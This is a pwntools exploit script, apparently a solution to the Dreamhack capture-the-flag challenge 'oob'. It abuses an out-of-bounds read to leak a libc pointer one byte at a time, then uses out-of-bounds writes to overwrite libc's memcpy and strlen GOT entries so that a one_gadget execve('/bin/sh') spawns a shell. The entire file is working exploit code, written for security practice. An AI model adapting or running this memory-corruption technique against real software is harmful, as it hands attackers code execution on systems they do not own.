from pwn import *
import warnings

warnings.filterwarnings('ignore')

#context.log_level = 'DEBUG'

#IP = "host3.dreamhack.games"
#PORT = 9634
#p = remote(IP, PORT)
p = process('./oob_patched')
gdb.attach(p,gdbscript='''
           brva 0x000000000000135C
           brva 0x000000000000139A
           ''')
#p = process('./oob', env={"LD_PRELOAD":"./libc.so.6"})
libc = ELF('./libc.so.6')

def read(offset):
    global stdout
    p.sendlineafter('> ', str(1))
    p.sendlineafter('offset: ', str(offset))

def write(offset, data):
    p.sendlineafter('> ', str(2))
    p.sendlineafter('offset: ', str(offset))
    p.sendlineafter('value: ', str(data))

# Leak libc
stdout = b''
read(0x10)
stdout += p.recv(1)
read(0x10+0x1)
stdout += p.recv(1)
read(0x10+0x2)
stdout += p.recv(1)
read(0x10+0x3)
stdout += p.recv(1)
read(0x10+0x4)
stdout += p.recv(1)
read(0x10+0x5)
stdout += p.recv(1)
read(0x10+0x6)
stdout += p.recv(1)
read(0x10+0x7)
stdout += p.recv(1)
stdout = u64(stdout)
log.info('stdout: '+hex(stdout))
libc_base = stdout - 0x21a780
log.info('libc_base: '+hex(libc_base))
strlen = libc_base + 0x219098
log.info('strlen: '+hex(strlen))
prev_memcpy = libc_base + 0x2CDC4
log.info('prev_memcpy: '+hex(prev_memcpy))
memcpy = libc_base + 0x219160
log.info('memcpy: '+hex(memcpy))
oneshot = libc_base + 0xebcf8
log.info('oneshot: '+hex(oneshot))

# Leak oob
oob = b''
read(-0x8)
oob += p.recv(1)
read(-0x8+0x1)
oob += p.recv(1)
read(-0x8+0x2)
oob += p.recv(1)
read(-0x8+0x3)
oob += p.recv(1)
read(-0x8+0x4)
oob += p.recv(1)
read(-0x8+0x5)
oob += p.recv(1)
read(-0x8+0x6)
oob += p.recv(1)
read(-0x8+0x7)
oob += p.recv(1)
oob = u64(oob)+0x8
log.info('oob: '+hex(oob))
log.info(f'prev_memcpy: {hex(prev_memcpy)}')

'''
0xebcf8 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
'''
## strlen got in libc -> "rsi == null, rdx == null" and "call memcpy" gadget in libc -> memcpy got in libc -> oneshot
input()
write(memcpy-oob, oneshot)
write(strlen-oob, prev_memcpy)

p.interactive()
